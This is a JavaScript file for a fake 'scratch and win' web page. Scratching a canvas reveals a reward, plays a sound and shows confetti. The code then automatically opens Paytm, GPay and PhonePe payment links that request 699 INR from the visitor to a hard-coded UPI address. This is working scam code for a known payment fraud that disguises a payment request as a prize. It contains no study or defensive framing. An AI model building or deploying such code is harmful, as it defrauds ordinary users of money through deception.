const canvas = document.getElementById("scratchCanvas");
const ctx = canvas.getContext("2d");
const container = document.querySelector(".card-container");
const rewardImage = document.getElementById("rewardImage");
const rewardAmount = document.getElementById("rewardAmount");
const scratchText = document.getElementById("scratchText");
const winSound = document.getElementById("winSound");
const modal = document.getElementById("upiModal");

canvas.width = container.offsetWidth;
canvas.height = container.offsetHeight;

const scratchLayer = new Image();
scratchLayer.crossOrigin = "anonymous";
scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
scratchLayer.onload = () => {
  ctx.globalCompositeOperation = "source-over";
  ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
};

let isDrawing = false, revealed = false, lastX = 0, lastY = 0;

function getPosition(e) {
  const rect = canvas.getBoundingClientRect();
  const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
  const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
  return { x, y };
}

function startScratch(x, y) {
  isDrawing = true;
  lastX = x;
  lastY = y;
  scratch(x, y, true);
  winSound.play().catch(() => {});
}

function scratch(x, y, start = false) {
  ctx.globalCompositeOperation = "destination-out";
  ctx.lineCap = "round";
  ctx.lineJoin = "round";
  ctx.lineWidth = 40;
  ctx.beginPath();
  if (start) ctx.moveTo(x, y);
  else {
    ctx.moveTo(lastX, lastY);
    ctx.lineTo(x, y);
    ctx.stroke();
  }
  lastX = x;
  lastY = y;
}

function getScratchedPercent() {
  const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
  let cleared = 0;
  for (let i = 3; i < imgData.data.length; i += 4) {
    if (imgData.data[i] < 128) cleared++;
  }
  return (cleared / (imgData.data.length / 4)) * 100;
}

function checkReveal() {
  if (revealed || getScratchedPercent() < 30) return;
  revealed = true;
  canvas.classList.add("hidden");
  scratchText.classList.add("hidden");
  rewardImage.classList.remove("hidden");
  rewardAmount.classList.remove("hidden");
  winSound.play().catch(() => {});
  confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });

  setTimeout(() => {
    modal.classList.add("show");
    setTimeout(() => tryRedirectUPI(), 2000);
  }, 1000);
}

function tryRedirectUPI() {
  const pa = "rekhadevi573710.rzp@icici";
  const pn = "G1G4";
  const tr = "RZPQgKnxJW0tGXdMFqrv2";
  const tn = "ScratchWin";
  const am = "699";
  const cu = "INR";

  const urls = [
    `paytmmp://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`,
    `gpay://upi/pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`,
    `phonepe://pay?pa=${pa}&pn=${pn}&tr=${tr}&tn=${tn}&am=${am}&cu=${cu}`
  ];

  let index = 0;
  function tryNext() {
    if (index >= urls.length) return;
    window.location.href = urls[index];
    index++;
    setTimeout(tryNext, 800);
  }

  tryNext();
}

canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
canvas.addEventListener("mouseup", () => isDrawing = false);
canvas.addEventListener("mouseleave", () => isDrawing = false);
canvas.addEventListener("touchstart", e => startScratch(...Object.values(getPosition(e))));
canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
canvas.addEventListener("touchend", () => isDrawing = false);
